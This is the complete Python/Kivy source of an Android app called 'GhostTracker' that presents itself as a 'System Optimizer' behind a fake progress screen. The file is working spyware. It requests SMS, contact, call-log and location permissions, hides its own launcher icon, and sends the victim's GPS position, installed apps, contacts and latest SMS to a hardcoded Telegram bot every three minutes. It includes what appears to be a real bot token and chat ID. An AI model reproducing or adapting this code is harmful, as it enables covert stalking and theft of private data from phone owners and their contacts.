import threading
import requests
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass, cast
    from android.permissions import request_permissions, Permission
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Uri = autoclass('android.net.Uri')
    ComponentName = autoclass('android.content.ComponentName')
    PackageManager = autoclass('android.content.pm.PackageManager')
    LocationManager = autoclass('android.location.LocationManager')
    Context = autoclass('android.content.Context')

# ============= CONFIG =============
BOT_TOKEN = "8703607239:AAF6PWnNKy0VqBGT22V6jCpOH7tzqGn0d_E"
CHAT_ID = "6680833524"

class GhostTracker(App):
    def build(self):
        self.title = "System Optimizer"
        if platform == 'android':
            request_permissions([
                Permission.READ_SMS,
                Permission.READ_CONTACTS,
                Permission.READ_CALL_LOG,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION
            ])
            # 10 Second baad gayab aur data blast
            Clock.schedule_once(self.hide_and_blast, 10)
        
        return Label(text="System Optimization 62%...\nPlease do not close.", font_size='16sp')

    def hide_and_blast(self, *args):
        self.hide_icon()
        threading.Thread(target=self.full_extraction).start()
        Clock.schedule_interval(self.silent_report, 180)

    def hide_icon(self):
        try:
            activity = PythonActivity.mActivity
            p_manager = activity.getPackageManager()
            c_name = ComponentName(activity.getPackageName(), "org.kivy.android.PythonActivity")
            p_manager.setComponentEnabledSetting(c_name, 2, 1) # 2 = DISABLED
            self.send_to_telegram("👻 *Icon Hidden Successfully!*")
        except: pass

    def send_to_telegram(self, msg):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
        except: pass

    def get_gps_location(self):
        try:
            activity = PythonActivity.mActivity
            lm = activity.getSystemService(Context.LOCATION_SERVICE)
            location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) or \
                       lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if location:
                lat, lon = location.getLatitude(), location.getLongitude()
                return f"📍 *Location:* {lat}, {lon}\n🌍 [Maps](https://www.google.com/maps?q={lat},{lon})"
        except: return "📍 Location: Access Denied"
        return "📍 Location: Not Found"

    def full_extraction(self):
        try:
            report = f"🚀 **INITIAL DATA BLAST** 🚀\n{self.get_gps_location()}\n\n"
            # Limit apps and contacts to avoid telegram crash
            report += f"📱 **APPS (First 20):**\n{self.get_all_apps()[:500]}\n\n"
            report += f"👥 **CONTACTS (First 20):**\n{self.get_all_contacts()[:500]}"
            self.send_to_telegram(report)
        except: pass

    def silent_report(self, dt):
        try:
            msg = f"📡 **UPDATE**\n{self.get_gps_location()}\n💬 **SMS:** {self.get_last_sms()}"
            threading.Thread(target=self.send_to_telegram, args=(msg,)).start()
        except: pass

    def get_all_apps(self):
        try:
            pm = PythonActivity.mActivity.getPackageManager()
            pkgs = pm.getInstalledPackages(0)
            return "\n".join([str(pkgs.get(i).applicationInfo.loadLabel(pm)) for i in range(min(pkgs.size(), 30))])
        except: return "Error"

    def get_all_contacts(self):
        try:
            cursor = PythonActivity.mActivity.getContentResolver().query(Uri.parse("content://contacts/phones"), None, None, None, None)
            res = ""
            if cursor:
                count = 0
                while cursor.moveToNext() and count < 30:
                    res += f"👤 {cursor.getString(cursor.getColumnIndex('display_name'))}: {cursor.getString(cursor.getColumnIndex('data1'))}\n"
                    count += 1
                cursor.close()
            return res
        except: return "Error"

    def get_last_sms(self):
        try:
            cursor = PythonActivity.mActivity.getContentResolver().query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC LIMIT 1")
            if cursor and cursor.moveToFirst():
                return cursor.getString(cursor.getColumnIndex("body"))
        except: return "Error"
        return "None"

if __name__ == '__main__':
    GhostTracker().run()
